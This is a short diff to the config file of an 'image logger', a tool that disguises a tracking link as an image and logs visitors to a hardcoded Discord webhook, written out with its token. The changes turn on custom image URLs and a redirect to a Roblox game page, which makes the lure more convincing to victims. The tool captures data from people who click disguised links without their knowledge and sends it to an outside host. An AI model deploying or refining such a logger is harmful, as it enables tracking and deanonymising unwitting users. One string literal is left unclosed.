@@ -12,7 +12,7 @@ config = {
     "webhook": "https://discord.com/api/webhooks/1412495995891351653/80m2W2-jhHTpHqxhzcMFNwnfDudptLb63Ms0GM0zISzbVYgT70Nbl1nXtW9NiM05BJp9",
     "image": "https://www.roblox.com/games/113149714573083/BETA-Death-Experience", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": False, # Allows you to use a URL argument to change the image (SEE THE README)
+    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
     "username": "roblox logger, # Set this to the name you want the webhook to have
@@ -47,7 +47,7 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
+        "redirect": True, # Redirect to a webpage?
         "page": "https://www.roblox.com/games/113149714573083/BETA-Death-Experience" # Link to the webpage to redirect to 
     },
 
